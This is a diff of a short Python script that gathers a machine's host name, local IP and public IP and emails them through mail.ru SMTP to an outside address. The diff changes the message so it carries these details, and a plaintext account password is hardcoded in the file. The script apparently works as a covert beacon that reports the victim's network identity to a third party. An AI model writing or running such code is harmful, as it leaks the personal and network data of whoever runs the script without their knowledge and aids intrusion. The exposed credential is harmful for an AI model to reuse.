@@ -1,7 +1,6 @@
 import socket
 from requests import get
 import smtplib as smtp
-import getpass
 
 # file = open('log.txt', 'w')
 
@@ -18,15 +17,14 @@ password = 'uuQsFq9RiJMxgRmiwLuD'
 
 dest_mail = 'sadtrollface@mail.ru'
 mail_subject = 'IP'
-mail_text = 'IP information'
+mail_text = f'Host: {host}\nLocal IP: {local_ip}\nPublic IP: {public_ip}'
 
-# message = 'From: {}\nTo: {}\nSubject: {}\nText: {}\n'.format(src_mail, dest_mail, mail_subject, mail_text)
-message = 'suck dick'
+message = 'From: {}\nTo: {}\nSubject: {}\n\n{}'.format(src_mail, dest_mail, 'IP', mail_text)
 
 server = smtp.SMTP_SSL('smtp.mail.ru')
 server.login(src_mail, password)
 server.auth_plain()
-server.sendmail(src_mail, dest_mail, message)
+server.sendmail(src_mail, dest_mail, mail_text)
 server.quit()
 
 # file.close()
